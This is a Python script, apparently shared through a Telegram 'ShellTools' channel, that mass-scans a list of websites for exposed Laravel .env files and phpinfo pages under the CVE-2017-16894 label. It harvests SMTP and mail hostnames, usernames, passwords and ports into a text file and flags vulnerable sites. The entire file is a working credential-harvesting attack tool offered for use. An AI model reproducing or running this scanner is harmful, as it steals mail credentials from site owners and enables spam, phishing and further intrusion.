# Coded BY JEX Coder  => T.me/ShellTools

import requests
from socket import gethostbyname
from re import findall
import sys
from multiprocessing import Pool
from os import system, name

def clear():
    linux = 'clear'
    windows = 'cls'
    system([linux, windows][name == 'nt'])


def banner():
    sssss = r'''
                               CVE-2017-16894
                   laravel / Apache Debug SMTP Scanner v1.0
                           Coded BY JEX Coder [VIP]
                              T.me/ShellTools                                      

    '''
    print(sssss)


def Mail_larvel(REZ):
    lenth = 20
    try:
        if 'SMTP_HOST=' in REZ:
            for i in range(lenth):
                Host = '{}'.format(findall('SMTP_HOST=(.*)', REZ)[i].replace('\r', ''))
                Port = '{}'.format(findall('SMTP_PORT=(.*)', REZ)[i].replace('\r', ''))
                User = '{}'.format(findall('SMTP_USERNAME=(.*)', REZ)[i].replace('\r', ''))
                Pass = '{}'.format(findall('SMTP_PASSWORD=(.*)', REZ)[i].replace('\r', ''))
                if 'mailtrap' in Host or User == 'null' or Pass == 'null':
                    pass
                elif len(Host) == 0 or len(Host) <= 3:
                    pass
                elif len(Pass) == 0:
                    pass
                elif len(User) == 0:
                    pass
                else:
                    print('{}:{}:{}:{}'.format(str(Host), str(User), str(Pass), str(Port)))
                    open('SMTP.txt', 'a').write('{}:{}:{}:{}\n'.format(str(Host), str(User), str(Pass), str(Port)))
        else:
            pass
    except:
        pass
    try:
        for i in range(lenth):
            Host = '{}'.format(findall('MAIL_HOST=(.*)', REZ)[i].replace('\r', ''))
            Port = '{}'.format(findall('MAIL_PORT=(.*)', REZ)[i].replace('\r', ''))
            User = '{}'.format(findall('MAIL_USERNAME=(.*)', REZ)[i].replace('\r', ''))
            Pass = '{}'.format(findall('MAIL_PASSWORD=(.*)', REZ)[i].replace('\r', ''))
            if 'mailtrap' in Host or User == 'null' or Pass == 'null':
                pass
            elif len(Host) == 0 or len(Host) <= 3:
                pass
            elif len(Pass) == 0:
                pass
            elif len(User) == 0:
                pass
            else:
                print('{}:{}:{}:{}'.format(str(Host), str(User), str(Pass), str(Port)))
                open('SMTP.txt', 'a').write('{}:{}:{}:{}\n'.format(str(Host), str(User), str(Pass), str(Port)))
    except:
        pass

    try:
        for i in range(lenth):
            Host = '{}'.format(findall('MAIL_HOST = (.*)', REZ)[i].replace('\r', ''))
            Port = '{}'.format(findall('MAIL_PORT = (.*)', REZ)[i].replace('\r', ''))
            User = '{}'.format(findall('MAIL_USERNAME = (.*)', REZ)[i].replace('\r', ''))
            Pass = '{}'.format(findall('MAIL_PASSWORD = (.*)', REZ)[i].replace('\r', ''))
            if 'mailtrap' in Host or User == 'null' or Pass == 'null':
                pass
            elif len(Host) == 0 or len(Host) <= 3:
                pass
            elif len(Pass) == 0:
                pass
            elif len(User) == 0:
                pass
            else:
                print('{}:{}:{}:{}'.format(str(Host), str(User), str(Pass), str(Port)))
                open('SMTP.txt', 'a').write('{}:{}:{}:{}\n'.format(str(Host), str(User), str(Pass), str(Port)))
    except:
        pass

    try:
        for i in range(lenth):
            Host = '{}'.format(findall('SMTP_HOST = (.*)', REZ)[i].replace('\r', ''))
            Port = '{}'.format(findall('SMTP_PORT = (.*)', REZ)[i].replace('\r', ''))
            User = '{}'.format(findall('SMTP_USERNAME = (.*)', REZ)[i].replace('\r', ''))
            Pass = '{}'.format(findall('SMTP_PASSWORD = (.*)', REZ)[i].replace('\r', ''))
            if 'mailtrap' in Host or User == 'null' or Pass == 'null':
                pass
            elif len(Host) == 0 or len(Host) <= 3:
                pass
            elif len(Pass) == 0:
                pass
            elif len(User) == 0:
                pass
            else:
                print('{}:{}:{}:{}'.format(str(Host), str(User), str(Pass), str(Port)))
                open('SMTP.txt', 'a').write('{}:{}:{}:{}\n'.format(str(Host), str(User), str(Pass), str(Port)))
    except:
        pass

def Check(url):
    try:
        ip = gethostbyname(url)
        resDebug = requests.get('http://' + url + '/.env', timeout=7).text
        check1 = 'http://' + ip + '/_profiler/phpinfo'
        resDebug2 = requests.get(check1, timeout=7).text
        resDebug3 = requests.get('http://' + url + '/_profiler/phpinfo', timeout=7).text
        resDebug4 = requests.get('http://' + url + '/phpinfo.php', timeout=7).text
        resDebug5 = requests.get('http://' + url + '/info.php', timeout=7).text
        if 'APP_NAME=Laravel' in resDebug or 'MAIL_USERNAME' in resDebug:
            print(' {} EXPLOITED> !~~~'.format(url))
            open('manualCheck.txt', 'a').write('{}/.env\n'.format(url))
            Mail_larvel(resDebug)
        elif 'PHP Variables' in resDebug2 or 'phpinfo()</title>' in resDebug2 and 'DB_PASSWORD' in resDebug2:
            print(' {} EXPLOITED> !~~~'.format(url))
            open('manualCheck.txt', 'a').write('{}/_profiler/phpinfo\n'.format(ip))
        elif 'PHP Variables' in resDebug3 or 'phpinfo()</title>' in resDebug3 and 'DB_PASSWORD' in resDebug3:
            print(' {} EXPLOITED> !~~~'.format(url))
            open('manualCheck.txt', 'a').write('{}/_profiler/phpinfo\n'.format(url))
        elif 'PHP Variables' in resDebug4 or 'phpinfo()</title>' in resDebug4 and 'DB_PASSWORD' in resDebug4:
            print(' {} EXPLOITED> !~~~'.format(url))
            open('manualCheck.txt', 'a').write('{}/phpinfo.php\n'.format(url))
        elif 'PHP Variables' in resDebug5 or 'phpinfo()</title>' in resDebug5 and 'DB_PASSWORD' in resDebug5:
            print(' {} EXPLOITED> !~~~'.format(url))
            open('manualCheck.txt', 'a').write('{}/info.php\n'.format(url))
        else:
            print(' {} NOT EXPLOITED!'.format(url))
    except:
        print(' {} NOT EXPLOITED!'.format(url))


if __name__ == '__main__':
    try:
        clear()
        banner()
        sites = open(sys.argv[1], 'r').read().splitlines()
        p = Pool(35)
        p.map(Check, sites)
    except:
        clear()
        banner()
        print('     usage: python {} sites.txt'.format(sys.argv[0]))
        sys.exit()